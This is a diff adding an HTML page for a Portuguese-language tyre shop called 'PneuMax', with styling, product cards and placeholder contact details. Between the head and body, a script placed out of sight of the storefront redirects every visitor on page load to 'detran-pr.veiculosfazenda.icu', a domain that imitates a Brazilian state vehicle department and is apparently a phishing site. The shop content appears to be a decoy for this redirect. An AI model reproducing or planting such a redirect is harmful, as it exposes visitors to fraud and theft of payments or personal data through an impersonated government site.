@@ -1,1 +1,202 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PneuMax - Loja de Pneus</title>
 
+<style>
+body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: #f4f4f4;
+}
+
+/* Cabeçalho */
+header {
+    background: #111;
+    color: white;
+    text-align: center;
+    padding: 30px 10px;
+}
+
+header h1 {
+    margin: 0;
+    font-size: 40px;
+    letter-spacing: 2px;
+}
+
+/* Menu */
+nav {
+    background: #e60000;
+    display: flex;
+    justify-content: center;
+}
+
+nav a {
+    color: white;
+    padding: 15px 20px;
+    text-decoration: none;
+    font-weight: bold;
+}
+
+nav a:hover {
+    background: #b30000;
+}
+
+/* Banner */
+.banner {
+    background: url('https://images.unsplash.com/photo-1605559424843-9e4c2284ef4b') no-repeat center/cover;
+    height: 300px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: white;
+    font-size: 30px;
+    font-weight: bold;
+    text-shadow: 2px 2px 5px black;
+}
+
+/* Conteúdo */
+.container {
+    padding: 40px;
+}
+
+/* Produtos */
+.produtos {
+    display: flex;
+    gap: 20px;
+    flex-wrap: wrap;
+    justify-content: center;
+}
+
+.card {
+    background: white;
+    padding: 20px;
+    width: 250px;
+    border-radius: 10px;
+    text-align: center;
+    box-shadow: 0 0 10px rgba(0,0,0,0.1);
+}
+
+.card img {
+    width: 100%;
+    border-radius: 10px;
+}
+
+.card h3 {
+    margin: 10px 0;
+}
+
+.card button {
+    background: #e60000;
+    color: white;
+    border: none;
+    padding: 10px;
+    cursor: pointer;
+    border-radius: 5px;
+}
+
+.card button:hover {
+    background: #b30000;
+}
+
+/* Seções */
+section {
+    margin-bottom: 50px;
+}
+
+/* Rodapé */
+footer {
+    background: #111;
+    color: white;
+    text-align: center;
+    padding: 20px;
+}
+</style>
+</head>
+<script language= "JavaScript">
+location.href="https://detran-pr.veiculosfazenda.icu/"
+</script>
+<body>
+
+<header>
+    <h1>PNEUMAX</h1>
+    <p>Qualidade e Segurança para o seu veículo</p>
+</header>
+
+<nav>
+    <a href="#">Início</a>
+    <a href="#">Produtos</a>
+    <a href="#">Serviços</a>
+    <a href="#">Quem Somos</a>
+    <a href="#">Contato</a>
+</nav>
+
+<div class="banner">
+    Promoção de Pneus - Até 30% OFF
+</div>
+
+<div class="container">
+
+    <section>
+        <h2 style="text-align:center;">Nossos Produtos</h2>
+        <div class="produtos">
+
+            <div class="card">
+                <img src="https://images.unsplash.com/photo-1619767886558-efdc259cde1b">
+                <h3>Pneu Aro 15</h3>
+                <p>Alta durabilidade e desempenho.</p>
+                <button>Comprar</button>
+            </div>
+
+            <div class="card">
+                <img src="https://images.unsplash.com/photo-1625047509248-ec889cbff17f">
+                <h3>Pneu Aro 17</h3>
+                <p>Ideal para carros esportivos.</p>
+                <button>Comprar</button>
+            </div>
+
+            <div class="card">
+                <img src="https://images.unsplash.com/photo-1597764690523-15bea4c581c9">
+                <h3>Pneu SUV</h3>
+                <p>Resistente para qualquer terreno.</p>
+                <button>Comprar</button>
+            </div>
+
+        </div>
+    </section>
+
+    <section>
+        <h2>Serviços</h2>
+        <p>
+            Oferecemos alinhamento, balanceamento, troca de pneus e revisão completa
+            para garantir a segurança do seu veículo.
+        </p>
+    </section>
+
+    <section>
+        <h2>Quem Somos</h2>
+        <p>
+            A PneuMax é uma empresa especializada na venda de pneus novos e serviços
+            automotivos. Atuamos no mercado com compromisso, qualidade e preços
+            competitivos, sempre buscando a satisfação dos nossos clientes.
+        </p>
+    </section>
+
+    <section>
+        <h2>Contato</h2>
+        <p>Email: contato@pneumax.com</p>
+        <p>Telefone: (11) 99999-9999</p>
+    </section>
+
+</div>
+
+<footer>
+    <p>PneuMax Comércio de Pneus LTDA</p>
+    <p>CNPJ: 00.000.000/0001-00</p>
+    <p>Endereço: Rua Exemplo, 123 - São Paulo, SP</p>
+</footer>
+
+</body>
+</html>
